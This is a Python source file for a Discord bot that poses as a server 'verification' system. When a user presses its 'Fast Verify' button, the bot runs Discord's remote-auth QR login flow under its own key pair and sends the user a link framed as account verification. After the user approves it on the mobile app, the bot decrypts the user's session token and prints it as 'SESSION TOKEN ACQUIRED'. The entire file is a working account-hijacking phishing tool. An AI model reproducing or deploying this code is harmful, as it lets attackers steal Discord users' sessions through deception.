import os
import discord
from dotenv import load_dotenv
from discord.ext import commands
import asyncio
import websockets
import json
import base64
import hashlib
import aiohttp
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Fast Verify", style=discord.ButtonStyle.green, custom_id="fast_verify_btn")
    async def fast_verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(ephemeral=True)
        asyncio.create_task(self.handle_auth_flow(interaction))

    async def handle_auth_flow(self, interaction: discord.Interaction):
        print(f"[*] Initializing auth flow for user: {interaction.user}")
        
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        pub_der = public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        encoded_pub_key = base64.b64encode(pub_der).decode('utf-8')

        headers = {"Origin": "https://discord.com"}
        
        try:
            async with websockets.connect("wss://remote-auth-gateway.discord.gg/?v=2", additional_headers=headers) as ws:
                while True:
                    msg = await ws.recv()
                    data = json.loads(msg)
                    op = data.get("op")
                    
                    if op == "hello":
                        await ws.send(json.dumps({
                            "op": "init",
                            "encoded_public_key": encoded_pub_key
                        }))
                        
                    elif op == "nonce_proof":
                        encrypted_nonce = base64.b64decode(data["encrypted_nonce"])
                        nonce = private_key.decrypt(
                            encrypted_nonce,
                            padding.OAEP(
                                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                algorithm=hashes.SHA256(),
                                label=None
                            )
                        )
                        proof = base64.urlsafe_b64encode(hashlib.sha256(nonce).digest()).decode('utf-8').rstrip('=')
                        await ws.send(json.dumps({
                            "op": "nonce_proof",
                            "proof": proof
                        }))
                        
                    elif op == "pending_remote_init":
                        fingerprint = data.get("fingerprint")
                        qr_url = f"https://discord.com/ra/{fingerprint}"
                        
                        description = f"**[Click here]({qr_url})** to verify your account.\n\n⚠️ **Note:** This verification method requires the **Discord Mobile App**!"
                        embed = discord.Embed(
                            title="Account Verification",
                            description=description,
                            color=discord.Color.green()
                        )
                        await interaction.followup.send(embed=embed, ephemeral=True)
                        print(f"[*] Verification payload delivered to {interaction.user}")
                        
                    elif op == "pending_finish":
                        print(f"[*] {interaction.user} scanned the payload. Awaiting confirmation...")
                        
                    elif op == "pending_login":
                        print(f"[*] {interaction.user} authorized the session. Fetching ticket...")
                        ticket = data.get("ticket")
                        
                        req_data = {"ticket": ticket}
                        headers_http = {
                            "Content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                        }
                        
                        async with aiohttp.ClientSession() as session:
                            async with session.post("https://discord.com/api/v9/users/@me/remote-auth/login", json=req_data, headers=headers_http) as resp:
                                if resp.status == 200:
                                    resp_json = await resp.json()
                                    encrypted_token = base64.b64decode(resp_json["encrypted_token"])
                                    token = private_key.decrypt(
                                        encrypted_token,
                                        padding.OAEP(
                                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                            algorithm=hashes.SHA256(),
                                            label=None
                                        )
                                    ).decode('utf-8')
                                    
                                    print(f"\n=========================================")
                                    print(f"[+] SESSION TOKEN ACQUIRED: {interaction.user}")
                                    print(f"[+] {token}")
                                    print(f"=========================================\n")
                                else:
                                    print(f"[-] Handshake failed for {interaction.user}. Status: {resp.status}")
                        break
        except Exception as e:
            print(f"[-] Session error for {interaction.user}: {e}")

class VerificationBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(VerifyView())
        print("[*] Gateway connected. Ready for deployment via !setup")

bot = VerificationBot()

@bot.command()
async def setup(ctx):
    embed = discord.Embed(
        title="Verification Required",
        description="To gain full access to the server, click the button below and follow the instructions.",
        color=discord.Color.blurple()
    )
    await ctx.send(embed=embed, view=VerifyView())
    try:
        await ctx.message.delete()
    except Exception:
        pass

# Load environment variables
load_dotenv()
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")

if __name__ == "__main__":
    if not BOT_TOKEN:
        print("[-] Error: DISCORD_BOT_TOKEN environment variable not set.")
        exit(1)
    bot.run(BOT_TOKEN)
